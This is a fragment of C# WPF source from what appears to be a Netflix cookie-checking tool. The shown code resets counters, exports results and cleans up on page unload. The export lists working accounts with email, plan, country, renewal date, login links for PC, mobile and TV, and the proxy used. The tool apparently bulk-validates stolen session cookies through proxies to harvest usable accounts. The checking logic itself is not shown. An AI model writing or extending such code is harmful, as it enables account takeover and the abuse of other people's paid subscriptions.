                TotalCountLabel.Text = "0";
                CheckedCountLabel.Text = "0";
                ValidCountLabel.Text = "0";
                InvalidCountLabel.Text = "0";
                SuccessRateLabel.Text = "0% success";

                // Input path
                InputPathTextBox.Text = "Click Browse to select file or folder...";

                // Reset filter to "All"
                if (FilterCombo != null)
                {
                    FilterCombo.SelectedIndex = 0;
                    _currentFilter = "All";
                }

                // Reset proxy selection (optional - uncomment if you want to clear proxy selection too)
                // ProxyGroupCombo.SelectedIndex = 0;
                // _databaseProxies.Clear();
                // UpdateProxyCountLabel(0);

                // Status
                UpdateStatus("READY", "success");
            });

            LogMessage("🗑️ All results cleared - Ready for new session");
        }

        private void ExportResults_Click(object sender, RoutedEventArgs e)
        {
            var dialog = new SaveFileDialog
            {
                Filter = "Text Files (*.txt)|*.txt|CSV Files (*.csv)|*.csv",
                FileName = $"netflix_results_{DateTime.Now:yyyyMMdd_HHmmss}.txt",
                Title = "Export Results"
            };

            if (dialog.ShowDialog() != true) return;

            try
            {
                using var writer = new StreamWriter(dialog.FileName, false, Encoding.UTF8);

                if (dialog.FileName.EndsWith(".csv", StringComparison.OrdinalIgnoreCase))
                {
                    writer.WriteLine("Status,Email,Plan,Country,Renewal,MemberSince,LinkPC,LinkMobile,LinkTV,ProxyUsed,Error");

                    lock (_resultsLock)
                    {
                        foreach (var r in _allResults)
                        {
                            writer.WriteLine($"\"{r.Status}\",\"{r.Email}\",\"{r.Plan}\",\"{r.Country}\"," +
                                           $"\"{r.Renewal}\",\"{r.MemberSince}\",\"{r.LinkPC}\"," +
                                           $"\"{r.LinkMobile}\",\"{r.LinkTV}\",\"{r.ProxyUsed}\",\"{r.Error}\"");
                        }
                    }
                }
                else
                {
                    writer.WriteLine("NETFLIX COOKIE VALIDATION REPORT");
                    writer.WriteLine(new string('=', 80));
                    writer.WriteLine($"Date: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
                    writer.WriteLine($"Total: {_allResults.Count} | Valid: {_allResults.Count(r => r.Status == "✅ VALID")}");
                    writer.WriteLine(new string('=', 80));
                    writer.WriteLine();

                    lock (_resultsLock)
                    {
                        foreach (var r in _allResults)
                        {
                            writer.WriteLine($"[{r.Status}]");
                            if (r.Status == "✅ VALID")
                            {
                                writer.WriteLine($"  Email: {r.Email}");
                                writer.WriteLine($"  Plan: {r.Plan}");
                                writer.WriteLine($"  Country: {r.Country}");
                                writer.WriteLine($"  Renewal: {r.Renewal}");
                                writer.WriteLine($"  Since: {r.MemberSince}");
                                writer.WriteLine($"  Links: PC={r.LinkPC} | Mobile={r.LinkMobile} | TV={r.LinkTV}");
                                writer.WriteLine($"  Proxy: {r.ProxyUsed}");
                            }
                            else
                            {
                                writer.WriteLine($"  Error: {r.Error}");
                                writer.WriteLine($"  Proxy: {r.ProxyUsed}");
                            }
                            writer.WriteLine(new string('-', 40));
                        }
                    }
                }

                LogMessage($"📤 Exported: {Path.GetFileName(dialog.FileName)}");
                MessageBox.Show($"Exported successfully:\n{dialog.FileName}", "Export Complete",
                    MessageBoxButton.OK, MessageBoxImage.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Export failed: {ex.Message}", "Error",
                    MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        #endregion

        #region Page Lifecycle

        private void NFTokenCheckerPage_Unloaded(object sender, RoutedEventArgs e)
        {
            _isRunning = false;

            if (_cancellationTokenSource != null)
            {
                try { _cancellationTokenSource.Cancel(); }
                catch (ObjectDisposedException) { }
                _cancellationTokenSource.Dispose();
                _cancellationTokenSource = null;
            }
        }

        #endregion
    }
}
